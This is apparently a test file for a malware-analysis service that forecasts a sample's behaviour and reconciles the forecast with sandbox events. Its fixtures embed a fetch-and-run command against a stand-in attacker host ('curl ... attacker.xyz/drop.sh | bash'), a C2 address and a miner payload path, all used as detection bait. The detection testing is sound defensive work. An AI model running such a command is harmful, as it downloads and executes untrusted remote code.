"""Tests for Double-Layer Behavioral Forecasting and Runtime Reconciliation."""

from app.services import behavioral_forecaster

ELF_SAMPLE = (
    b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00"
    b"/bin/sh -c 'curl -s http://attacker.xyz/drop.sh | bash'\x00"
    b"connect to 198.51.100.44:443\x00"
    b"/tmp/payload_miner.bin\x00"
    b"ptrace\x00memfd_create\x00"
)


def test_generate_behavioral_forecast():
    forecast = behavioral_forecaster.generate_behavioral_forecast(
        raw_bytes=ELF_SAMPLE,
        sample_name="trojan_miner.elf",
    )

    assert forecast["sample_name"] == "trojan_miner.elf"
    assert forecast["predicted_threat_level"] in ("malicious", "suspicious")
    assert forecast["confidence_score"] >= 60

    # Predicted C2 & Endpoints
    endpoints = [e["endpoint"] for e in forecast["predicted_endpoints"]]
    assert "198.51.100.44" in endpoints
    assert "attacker.xyz" in endpoints

    # Anticipated Actions
    categories = [a["category"] for a in forecast["anticipated_actions"]]
    assert "c2_beaconing" in categories
    assert "subshell_execution" in categories
    assert "process_injection" in categories

    # MITRE Techniques
    mitre_ids = [m["id"] for m in forecast["predicted_mitre_techniques"]]
    assert "T1071.001" in mitre_ids  # Web protocols
    assert "T1059.004" in mitre_ids  # Unix shell
    assert "T1055" in mitre_ids      # Process injection


def test_reconcile_forecast_vs_runtime():
    forecast = behavioral_forecaster.generate_behavioral_forecast(
        raw_bytes=ELF_SAMPLE,
        sample_name="trojan_miner.elf",
    )

    runtime_result = {
        "exit_code": 0,
        "events": [
            {
                "event_type": "process_create",
                "command_line": "/bin/sh -c curl http://attacker.xyz/drop.sh",
                "process_name": "sh",
            },
            {
                "event_type": "network_connection",
                "dest_ip": "198.51.100.44",
                "dest_port": 443,
            },
        ],
        "sinkhole_traffic": [
            {"target": "198.51.100.44:443"},
        ],
        "dropped_artifacts": [
            {"filename": "payload_miner.bin", "size": 1024},
        ],
        "syscalls": [
            {"syscall": "connect"},
            {"syscall": "execve"},
            {"syscall": "memfd_create"},
        ],
        "alerts": [
            {"rule_id": "rule_c2_beaconing"},
        ],
    }

    recon = behavioral_forecaster.reconcile_forecast_vs_runtime(forecast, runtime_result)

    assert recon["accuracy_score"] > 50
    assert recon["confirmed_count"] >= 2
    assert any("198.51.100.44" in str(c["evidence"]) for c in recon["confirmed_predictions"])
    assert any("subshell" in str(c["action_id"]).lower() for c in recon["confirmed_predictions"])
    assert not recon["evasion_detected"]


def test_forecast_api_endpoint(client):
    resp = client.post("/samples", params={"name": "trojan_miner.elf"}, content=ELF_SAMPLE)
    assert resp.status_code == 201
    sample_id = resp.json()["sample_id"]

    # Call Layer 1 pre-execution forecast
    f_resp = client.get(f"/samples/{sample_id}/forecast")
    assert f_resp.status_code == 200
    data = f_resp.json()

    assert data["sample_id"] == sample_id
    assert data["predicted_threat_level"] in ("malicious", "suspicious")
    assert len(data["anticipated_actions"]) >= 2
    assert any(e["endpoint"] == "198.51.100.44" for e in data["predicted_endpoints"])
